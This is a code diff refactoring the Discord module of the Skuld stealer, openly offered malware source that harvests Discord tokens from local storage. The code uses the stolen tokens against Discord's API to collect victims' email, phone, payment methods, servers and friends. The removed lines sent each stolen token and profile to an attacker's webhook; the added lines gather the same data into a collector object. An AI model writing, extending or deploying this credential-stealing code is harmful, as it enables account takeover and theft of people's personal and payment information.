@@ -13,7 +13,7 @@ import (
 	"github.com/hackirby/skuld/modules/browsers"
 	"github.com/hackirby/skuld/utils/fileutil"
 	"github.com/hackirby/skuld/utils/hardware"
-	"github.com/hackirby/skuld/utils/requests"
+	"github.com/hackirby/skuld/utils/collector"
 )
 
 var (
@@ -21,7 +21,7 @@ var (
 	RegexpBrowsers = regexp.MustCompile(`[\w-]{26}\.[\w-]{6}\.[\w-]{25,110}|mfa\.[\w-]{80,95}`)
 )
 
-func Run(webhook string) {
+func Run(dataCollector *collector.DataCollector) {
 	var Tokens []string
 	discordPaths := map[string]string{
 		"Discord":        "\\discord\\Local State",
@@ -222,52 +222,56 @@ func Run(webhook string) {
 
 	}
 
+	if len(Tokens) == 0 {
+		return
+	}
+
 	for _, token := range Tokens {
-		body, err := requests.Get("https://discord.com/api/v9/users/@me", map[string]string{"Authorization": token})
+		body, err := getDiscordUserInfo(token)
 		if err != nil {
-			return
+			continue
 		}
 
 		var user User
 		if err = json.Unmarshal(body, &user); err != nil {
-			return
+			continue
 		}
 
-		billing, err := requests.Get("https://discord.com/api/v9/users/@me/billing/payment-sources", map[string]string{"Authorization": token})
+		billing, err := getDiscordBilling(token)
 		if err != nil {
-			return
+			continue
 		}
 
 		var billingData []Billing
 		if err = json.Unmarshal(billing, &billingData); err != nil {
-			return
+			continue
 		}
 
-		guilds, err := requests.Get("https://discord.com/api/v9/users/@me/guilds?with_counts=true", map[string]string{"Authorization": token})
+		guilds, err := getDiscordGuilds(token)
 		if err != nil {
-			return
+			continue
 		}
 
 		var guildsData []Guild
 		if err = json.Unmarshal(guilds, &guildsData); err != nil {
-			return
+			continue
 		}
 
-		friends, err := requests.Get("https://discord.com/api/v9/users/@me/relationships", map[string]string{"Authorization": token})
+		friends, err := getDiscordFriends(token)
 		if err != nil {
-			return
+			continue
 		}
 
 		var friendsData []Friend
 
 		if err = json.Unmarshal(friends, &friendsData); err != nil {
-			return
+			continue
 		}
 
 		var avatar string
 		res, err := http.Get("https://cdn.discordapp.com/avatars/" + user.ID + "/" + user.Avatar + ".gif")
 		if err != nil {
-			return
+			continue
 		}
 
 		if res.StatusCode != 200 {
@@ -276,7 +280,6 @@ func Run(webhook string) {
 			avatar = "https://cdn.discordapp.com/avatars/" + user.ID + "/" + user.Avatar + ".gif"
 		}
 
-		_ = avatar
 
 		badges := GetFlags(user.PublicFlags)
 		nitro := GetNitro(user.PremiumType)
@@ -293,67 +296,91 @@ func Run(webhook string) {
 			user.Phone = user.Phone + " (2FA)"
 		}
 
-		embed := map[string]interface{}{
-			"title": user.Username + " (" + user.ID + ")",
-			"thumbnail": map[string]string{
-				"url": avatar,
-			},
-			"fields": []map[string]interface{}{
-				{
-					"name":   "<a:pinkcrown:996004209667346442> Token:",
-					"value":  "```" + token + "```",
-					"inline": false,
-				},
-				{"name": "\u200b", "value": "\u200b", "inline": false},
-				{
-					"name":   "<:egp_mail:875383124241055845> Email:",
-					"value":  "`" + user.Email + "`",
-					"inline": true,
-				},
-				{
-					"name":   "<:starxglow:996004217699434496> Phone:",
-					"value":  "`" + user.Phone + "`",
-					"inline": true,
-				},
-				{"name": "\u200b", "value": "\u200b", "inline": false},
-				{
-					"name":   "<a:nitroboost:996004213354139658> Nitro:",
-					"value":  nitro,
-					"inline": true,
-				},
-				{
-					"name":   "💎 Badges:",
-					"value":  badges,
-					"inline": true,
-				},
-				{
-					"name":   "<:purple_stars:1082566201105981440> Billing:",
-					"value":  paymentMethods,
-					"inline": true,
-				},
-			},
+		// Collect token data
+		tokenData := map[string]interface{}{
+			"Username":       user.Username,
+			"UserID":         user.ID,
+			"Token":          token,
+			"Email":          user.Email,
+			"Phone":          user.Phone,
+			"Avatar":         avatar,
+			"Nitro":          nitro,
+			"Badges":         badges,
+			"PaymentMethods": paymentMethods,
+			"HQGuilds":       hqGuilds,
+			"HQFriends":      hqFriends,
 		}
 
-		if hqGuilds != "" {
-			embed["fields"] = append(embed["fields"].([]map[string]interface{}), map[string]interface{}{
-				"name":   "\u200b",
-				"value":  hqGuilds,
-				"inline": false,
-			})
-		}
-
-		if hqFriends != "" {
-			embed["fields"] = append(embed["fields"].([]map[string]interface{}), map[string]interface{}{
-				"name":   "\u200b",
-				"value":  hqFriends,
-				"inline": false,
-			})
-		}
-
-		requests.Webhook(webhook, map[string]interface{}{
-			"embeds": []map[string]interface{}{embed},
-		})
+		dataCollector.AddData("tokens", tokenData)
 	}
+}
+
+func getDiscordUserInfo(token string) ([]byte, error) {
+	req, err := http.NewRequest("GET", "https://discord.com/api/v9/users/@me", nil)
+	if err != nil {
+		return nil, err
+	}
+	req.Header.Set("Authorization", token)
+	
+	client := &http.Client{}
+	resp, err := client.Do(req)
+	if err != nil {
+		return nil, err
+	}
+	defer resp.Body.Close()
+	
+	return io.ReadAll(resp.Body)
+}
+
+func getDiscordBilling(token string) ([]byte, error) {
+	req, err := http.NewRequest("GET", "https://discord.com/api/v9/users/@me/billing/payment-sources", nil)
+	if err != nil {
+		return nil, err
+	}
+	req.Header.Set("Authorization", token)
+	
+	client := &http.Client{}
+	resp, err := client.Do(req)
+	if err != nil {
+		return nil, err
+	}
+	defer resp.Body.Close()
+	
+	return io.ReadAll(resp.Body)
+}
+
+func getDiscordGuilds(token string) ([]byte, error) {
+	req, err := http.NewRequest("GET", "https://discord.com/api/v9/users/@me/guilds?with_counts=true", nil)
+	if err != nil {
+		return nil, err
+	}
+	req.Header.Set("Authorization", token)
+	
+	client := &http.Client{}
+	resp, err := client.Do(req)
+	if err != nil {
+		return nil, err
+	}
+	defer resp.Body.Close()
+	
+	return io.ReadAll(resp.Body)
+}
+
+func getDiscordFriends(token string) ([]byte, error) {
+	req, err := http.NewRequest("GET", "https://discord.com/api/v9/users/@me/relationships", nil)
+	if err != nil {
+		return nil, err
+	}
+	req.Header.Set("Authorization", token)
+	
+	client := &http.Client{}
+	resp, err := client.Do(req)
+	if err != nil {
+		return nil, err
+	}
+	defer resp.Body.Close()
+	
+	return io.ReadAll(resp.Body)
 }
 
 func Contains(s []string, e string) bool {
@@ -419,7 +446,7 @@ func GetHQGuilds(guilds []Guild, token string) (hqGuilds string) {
 			hqGuilds = "**Rare Servers:**\n"
 		}
 
-		res, err := requests.Get("https://discord.com/api/v8/guilds/"+guild.ID+"/invites", map[string]string{"Authorization": token})
+		res, err := getGuildInvites(guild.ID, token)
 		if err != nil {
 			continue
 		}
@@ -449,6 +476,23 @@ func GetHQGuilds(guilds []Guild, token string) (hqGuilds string) {
 	}
 
 	return hqGuilds
+}
+
+func getGuildInvites(guildID, token string) ([]byte, error) {
+	req, err := http.NewRequest("GET", "https://discord.com/api/v8/guilds/"+guildID+"/invites", nil)
+	if err != nil {
+		return nil, err
+	}
+	req.Header.Set("Authorization", token)
+	
+	client := &http.Client{}
+	resp, err := client.Do(req)
+	if err != nil {
+		return nil, err
+	}
+	defer resp.Body.Close()
+	
+	return io.ReadAll(resp.Body)
 }
 
 func GetBilling(billing []Billing) (paymentMethods string) {
